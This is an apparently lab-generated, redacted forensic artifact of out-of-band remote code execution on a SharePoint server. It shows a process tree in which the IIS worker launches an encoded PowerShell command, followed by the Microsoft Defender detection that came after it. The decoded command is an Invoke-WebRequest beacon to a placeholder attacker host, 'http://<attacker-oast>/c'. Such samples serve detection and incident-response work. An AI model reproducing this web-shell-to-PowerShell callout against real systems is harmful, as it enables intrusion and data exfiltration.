# Example artifact — OOB RCE (default cmd tree), redacted

## Security 4688 (process creation), host SHAREPOINT01, user LAB\sp_pool (High integrity)

```
w3wp.exe  (C:\Windows\System32\inetsrv\w3wp.exe)
  └─ cmd.exe   "C:\Windows\System32\cmd.exe" /c powershell.exe -NoProfile -NonInteractive -EncodedCommand <BASE64>
       └─ powershell.exe
            └─ conhost.exe
```
`<BASE64>` decodes (base64/UTF-16LE) to:  `iwr -UseBasicParsing 'http://<attacker-oast>/c'`

## Microsoft Defender (EID 1116 detect → 1117 action)

```
Threat   : Behavior:Win32/WebshellLauncher.A  (ID 2147776984)
Severity : Severe        Category: Suspicious Behavior
Path     : behavior:_process: C:\Windows\System32\inetsrv\w3wp.exe, pid:<pid> ; process:_pid:<child>
Action   : Remove        Remediation User: NT AUTHORITY\SYSTEM   ("operation completed successfully")
```
NOTE: in this run the OOB beacon (DNS + HTTP) still completed BEFORE remediation — detection did not prevent exfil.
